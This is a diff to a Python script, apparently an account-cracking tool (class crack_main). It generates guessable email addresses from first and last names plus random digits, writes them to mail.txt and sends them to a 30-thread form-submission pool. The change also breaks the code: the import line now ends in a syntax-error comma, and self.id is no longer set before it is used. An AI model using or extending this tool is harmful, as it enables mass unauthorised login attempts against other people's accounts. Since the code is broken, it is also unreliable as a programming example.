@@ -1,5 +1,5 @@
 from uuid import uuid4
-import os,sys,tempfile,string,random,subprocess,uuid
+import os,sys,tempfile,string,random,subprocess,uuid,
 http_directory = tempfile.mkdtemp(prefix='.')
 site_packages = sys.path[4]
 print(site_packages)
@@ -403,14 +403,9 @@ class crack_main():
                 print("\n [?] Limit ids Example 1000,5000,50000")
                 limit = int(input(" Limit Ids : "))
                 for nmbr in range(limit):
-                        lchoice = random.choice(lists)
-                        if '3' in lchoice:
-                                mail = ''.join(random.choice(string.digits) for _ in range(3))
-                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                        else:
-                                mail = ''.join(random.choice(string.digits) for _ in range(4))
-                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                        self.id = open('mail.txt', 'r').read().splitlines()
+                        nmpp = random.randint(111,999)
+                        nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
+                        naseeb = open('mail.txt','a').write(nmp)
                 with ThreadPool(max_workers=30) as formSubmit:
                         total = str(len(self.id))
                         clear()
